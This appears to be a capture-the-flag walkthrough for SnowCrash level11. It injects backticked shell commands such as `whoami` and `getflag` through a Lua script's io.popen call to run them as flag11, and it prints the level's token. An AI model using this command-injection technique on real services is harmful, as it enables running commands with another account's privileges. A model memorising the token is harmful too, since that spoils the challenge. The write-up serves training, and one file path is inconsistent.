
-> ls -la

-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua

-> cat level11.lua

(The cat output is in the level11.lua file in this same directory)

As we can see in the following line of the file :

prog = io.popen("echo "..pass.." | sha1sum", "r")

It builds a shell command by pasting the value we send (pass)
after echo, then executes that command.

So let's try !

level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: f05d1d066fb246efe0c6f7d095f909a7a0cf34a0
Erf nope..

level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: echo pop > /tmp/pop
Erf nope..

level11@SnowCrash:~$ cat /tmp/pop              #we can see here that we can indeed make the program execute command for us
echo pop

level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: `whoami` > /tmp/pop
Erf nope..

level11@SnowCrash:~$ cat /tmp/popen             # Futhermore it is as flag11 that the command is executed
flag11

level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: `getflag` > /tmp/pop
Erf nope..

level11@SnowCrash:~$ cat /tmp/pop
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

-> su level12 ..